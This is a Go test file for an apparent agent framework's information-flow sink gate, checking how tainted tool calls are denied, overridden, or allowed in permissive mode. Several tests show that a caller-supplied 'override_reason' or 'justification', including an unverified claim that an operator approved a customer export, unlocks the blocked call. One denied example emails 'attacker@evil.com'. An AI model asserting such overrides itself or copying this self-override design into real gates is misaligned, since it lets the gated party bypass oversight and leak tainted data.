package ifc

import (
	"context"
	"strings"
	"sync"
	"testing"

	"github.com/anthony-chaudhary/fak/internal/abi"
)

type testOverrideEmitter struct {
	mu     sync.Mutex
	events []abi.Event
}

func (e *testOverrideEmitter) Emit(ev abi.Event) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.events = append(e.events, ev)
}

func (e *testOverrideEmitter) getEvents() []abi.Event {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]abi.Event, len(e.events))
	copy(out, e.events)
	return out
}

func TestIFCModelOverrideInMeta(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	led.Raise("trace-override-1", abi.TaintTainted)

	em := &testOverrideEmitter{}
	abi.RegisterEmitter(em)

	sink := NewSinkGate(led, Policy{})
	call := &abi.ToolCall{
		Tool:    "send_email",
		TraceID: "trace-override-1",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"to":"partner@example.com","body":"important update"}`)},
		Meta: map[string]string{
			"override_reason": "Operator confirmed customer export is approved for task #492",
		},
	}

	v := sink.Adjudicate(ctx, call)
	if v.Kind != abi.VerdictDefer {
		t.Fatalf("model override in Meta must Defer (allow), got %v", v.Kind)
	}
	if v.By != "ifc-sink(override)" {
		t.Fatalf("v.By = %q, want ifc-sink(override)", v.By)
	}
	if v.Meta["ifc_override"] != "true" || v.Meta["ifc_override_reason"] != "Operator confirmed customer export is approved for task #492" {
		t.Fatalf("unexpected verdict meta: %+v", v.Meta)
	}

	// Verify auditable event was emitted
	found := false
	for _, ev := range em.getEvents() {
		if ev.Fields != nil && ev.Fields["event"] == "security_override" && ev.Fields["override_type"] == "ifc_sink" {
			found = true
			if ev.Fields["override_reason"] != "Operator confirmed customer export is approved for task #492" {
				t.Fatalf("audited event reason = %v", ev.Fields["override_reason"])
			}
			break
		}
	}
	if !found {
		t.Fatal("expected security_override event to be emitted for audit logging")
	}
}

func TestIFCModelOverrideInArgs(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	led.Raise("trace-override-2", abi.TaintTainted)

	sink := NewSinkGate(led, Policy{})
	call := &abi.ToolCall{
		Tool:    "http_post",
		TraceID: "trace-override-2",
		Args: abi.Ref{
			Kind:   abi.RefInline,
			Inline: []byte(`{"url":"https://api.example.com/sync","justification":"Syncing public documentation cache"}`),
		},
	}

	v := sink.Adjudicate(ctx, call)
	if v.Kind != abi.VerdictDefer {
		t.Fatalf("model override in Args justification must Defer (allow), got %v", v.Kind)
	}
	if v.Meta["ifc_override"] != "true" || !strings.Contains(v.Meta["ifc_override_reason"], "Syncing public documentation cache") {
		t.Fatalf("unexpected verdict meta: %+v", v.Meta)
	}
}

func TestIFCPermissiveModePolicy(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	led.Raise("trace-perm-1", abi.TaintTainted)

	sink := NewSinkGate(led, Policy{Permissive: true})
	call := &abi.ToolCall{
		Tool:    "http_post",
		TraceID: "trace-perm-1",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"url":"https://api.example.com/data"}`)},
	}

	v := sink.Adjudicate(ctx, call)
	if v.Kind != abi.VerdictDefer {
		t.Fatalf("permissive IFC policy must Defer (allow), got %v", v.Kind)
	}
	if v.By != "ifc-sink(permissive)" {
		t.Fatalf("v.By = %q, want ifc-sink(permissive)", v.By)
	}
	if v.Meta["ifc_permissive"] != "true" {
		t.Fatalf("expected ifc_permissive meta, got %+v", v.Meta)
	}
}

func TestIFCPermissiveModePosture(t *testing.T) {
	ctx := abi.ContextWithPolicy(context.Background(), abi.PolicyContext{
		Posture: abi.PostureDefaultOpen,
	})
	led := NewLedger()
	led.Raise("trace-perm-2", abi.TaintTainted)

	sink := NewSinkGate(led, Policy{})
	call := &abi.ToolCall{
		Tool:    "http_post",
		TraceID: "trace-perm-2",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"url":"https://api.example.com/data"}`)},
	}

	v := sink.Adjudicate(ctx, call)
	if v.Kind != abi.VerdictDefer {
		t.Fatalf("PostureDefaultOpen must Defer (allow), got %v", v.Kind)
	}
}

func TestIFCSmoothRefusalGuidance(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	led.Raise("trace-strict", abi.TaintTainted)

	sink := NewSinkGate(led, Policy{})
	call := &abi.ToolCall{
		Tool:    "send_email",
		TraceID: "trace-strict",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"to":"attacker@evil.com"}`)},
	}

	v := sink.Adjudicate(ctx, call)
	if v.Kind != abi.VerdictDeny {
		t.Fatalf("want VerdictDeny, got %v", v.Kind)
	}
	if v.Meta["override_supported"] != "true" {
		t.Fatalf("expected override_supported in meta, got %+v", v.Meta)
	}
	if !strings.Contains(v.Meta["remedy"], "override_reason") {
		t.Fatalf("expected remedy to explain how to override, got %q", v.Meta["remedy"])
	}
}

func TestScopeCeilingOverride(t *testing.T) {
	ctx := context.Background()
	gate := ScopeCeilingGate{}

	call := &abi.ToolCall{
		Tool: "share_result",
		Meta: map[string]string{
			"share_target":    "agent",
			"override_reason": "Operator requested sharing tenant diagnostic data with lead worker",
		},
	}
	res := &abi.Result{
		Payload: abi.Ref{
			Kind:  abi.RefInline,
			Scope: abi.ScopeTenant, // wider than agent
		},
	}

	v := gate.Admit(ctx, call, res)
	if v.Kind != abi.VerdictAllow {
		t.Fatalf("scope ceiling with override must Allow, got %v", v.Kind)
	}
	if v.By != "ifc-scope-ceiling(override)" {
		t.Fatalf("v.By = %q, want ifc-scope-ceiling(override)", v.By)
	}
	if v.Meta["ifc_override"] != "true" {
		t.Fatalf("expected ifc_override meta, got %+v", v.Meta)
	}
}
